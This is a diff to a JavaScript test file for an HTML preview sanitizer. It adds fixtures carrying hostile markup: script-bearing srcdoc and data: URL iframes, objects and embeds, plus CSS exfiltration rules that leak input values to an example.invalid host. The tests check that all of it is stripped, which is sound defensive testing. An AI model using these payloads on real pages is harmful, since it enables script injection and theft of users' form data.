@@ -401,8 +401,8 @@ function fieldLabels(fields) {
 }
 
 {
-  // Scripts are the exception: the preview frame shares an origin with the
-  // editor, so author JavaScript is left out and the omission is reported.
+  // Scripts are the exception: the opaque-origin preview leaves author
+  // JavaScript out, and srcdoc is stripped to prevent nested-frame escapes.
   const rendered = preview.renderQuestion({
     question: 'Q',
     subquestion: '<div class="alert">Hi<script>parent.location="/gone"</script></div>',
@@ -414,6 +414,35 @@ function fieldLabels(fields) {
 
   const handler = preview.sanitizeHtml('<div onclick="steal()" class="a">x</div>');
   assert.strictEqual(handler, '<div class="a">x</div>');
+  const nestedFrame = preview.sanitizeHtml(
+    '<iframe srcdoc="&lt;script&gt;window.top.steal()&lt;/script&gt;"></iframe>'
+  );
+  assert.ok(!nestedFrame.includes('srcdoc='));
+  const nestedDataFrame = preview.sanitizeHtml(
+    '<div class="alert">Safe text</div>' +
+      '<iframe src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E">fallback</iframe>' +
+      '<object data="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E"></object>' +
+      '<embed src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E">' +
+      '<link rel="stylesheet" href="https://example.invalid/steal.css"><base href="https://example.invalid/">'
+  );
+  assert.ok(nestedDataFrame.includes('<div class="alert">Safe text</div>'));
+  assert.ok(!/<\/?(?:iframe|object|embed|link|base)\b/i.test(nestedDataFrame));
+  const cssExfil = preview.sanitizeHtml(
+    '<style>@import url("https://example.invalid/steal.css"); ' +
+      'input[value^="SECRET"] { background: url("https://example.invalid/leak") }</style>' +
+      '<div class="alert" style="background-image:url(https://example.invalid/leak)">Safe text</div>',
+    {}
+  );
+  assert.ok(!/<\/?style\b/i.test(cssExfil));
+  assert.ok(!/\sstyle\s*=/i.test(cssExfil));
+  assert.ok(cssExfil.includes('<div class="alert">Safe text</div>'));
+  const embedded = preview.renderQuestion({
+    question: 'Q',
+    subquestion: '<style>input[value^="SECRET"]{background:url(https://example.invalid/leak)}</style>' +
+      '<iframe src="data:text/html,%3Cscript%3Eparent.steal()%3C%2Fscript%3E"></iframe>',
+    fields: [],
+  });
+  assert.ok(embedded.notes.some((n) => n.includes('user-defined CSS')));
   assert.strictEqual(preview.sanitizeHtml('<a href="javascript:evil()">x</a>'), '<a href="">x</a>');
 }
 
